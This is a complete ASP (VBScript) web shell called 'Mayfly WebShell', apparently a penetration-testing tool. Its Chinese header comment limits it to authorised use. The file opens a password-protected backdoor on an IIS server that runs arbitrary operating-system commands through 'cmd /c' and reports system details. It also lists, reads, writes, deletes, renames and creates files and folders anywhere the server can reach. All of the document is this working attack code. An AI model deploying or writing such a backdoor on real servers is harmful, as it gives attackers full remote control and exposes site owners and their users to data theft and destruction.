<%@ Language="VBScript" CodePage=65001 %>
<%
' ============================================================
'  Mayfly WebShell - ASP 服务端脚本 (VBScript)
'  仅用于授权渗透测试与自有资产管理，禁止用于未授权访问。
'  部署到 IIS 后，请修改 key 为高强度连接密码。
'  协议：明文表单(非 base64)，字段 key=action，辅助字段 path/cmd/content/new_path
' ============================================================
Response.ContentType = "text/plain"

Dim key, action, p, cmd, content, newPath, out
key = "mayfly"
action = Trim(Request.Form(key) & "")
If action = "" Then action = Trim(Request.Form("mayfly") & "")
If action = "" Then Response.Write "error: empty action" : Response.End

Set fso = CreateObject("Scripting.FileSystemObject")

Select Case action
    Case "cmd"
        cmd = Request.Form("cmd")
        If cmd = "" Then Response.Write "error: empty cmd" : Response.End
        Set shell = CreateObject("WScript.Shell")
        Set ex = shell.Exec("cmd /c " & cmd & " 2>&1")
        out = ex.StdOut.ReadAll
        Response.Write out

    Case "sysinfo"
        Set shell = CreateObject("WScript.Shell")
        out = "ASP: " & ScriptEngine & " " & ScriptEngineMajorVersion & "." & ScriptEngineMinorVersion & vbCrLf
        out = out & "OS: " & shell.ExpandEnvironmentStrings("%OS%") & vbCrLf
        out = out & "User: " & shell.ExpandEnvironmentStrings("%USERNAME%") & vbCrLf
        Response.Write out

    Case "fileList"
        p = Request.Form("path")
        If p = "" Then p = "."
        If Not fso.FolderExists(p) Then Response.Write "error: not a directory" : Response.End
        Set folder = fso.GetFolder(p)
        Response.Write folder.Path & vbCrLf
        If Not folder.IsRootFolder Then
            Response.Write "d|0|0|.." & vbTab & folder.ParentFolder.Path & vbCrLf
        End If
        Dim fol
        For Each fol In folder.SubFolders
            Response.Write "d|0|" & ToUnix(fol.DateLastModified) & "|" & fol.Name & vbCrLf
        Next
        Dim fil
        For Each fil In folder.Files
            Response.Write "f|" & fil.Size & "|" & ToUnix(fil.DateLastModified) & "|" & fil.Name & vbCrLf
        Next

    Case "fileRead"
        p = Request.Form("path")
        If Not fso.FileExists(p) Then Response.Write "error: not a file" : Response.End
        Set f = fso.OpenTextFile(p, 1, False)
        out = f.ReadAll
        f.Close
        Response.Write out

    Case "fileWrite"
        p = Request.Form("path")
        content = Request.Form("content")
        Set f = fso.CreateTextFile(p, True)
        f.Write content
        f.Close
        Response.Write "ok"

    Case "fileDelete"
        p = Request.Form("path")
        If fso.FileExists(p) Then fso.DeleteFile p
        If fso.FolderExists(p) Then fso.DeleteFolder p
        Response.Write "ok"

    Case "fileRename"
        p = Request.Form("path")
        newPath = Request.Form("new_path")
        If fso.FileExists(p) Then fso.MoveFile p, newPath
        If fso.FolderExists(p) Then fso.MoveFolder p, newPath
        Response.Write "ok"

    Case "fileMkdir"
        p = Request.Form("path")
        If Not fso.FolderExists(p) Then fso.CreateFolder p
        Response.Write "ok"

    Case Else
        Response.Write "error: unknown action " & action
End Select

Function ToUnix(d)
    ToUnix = DateDiff("s", "1970-01-01 00:00:00", d)
End Function
%>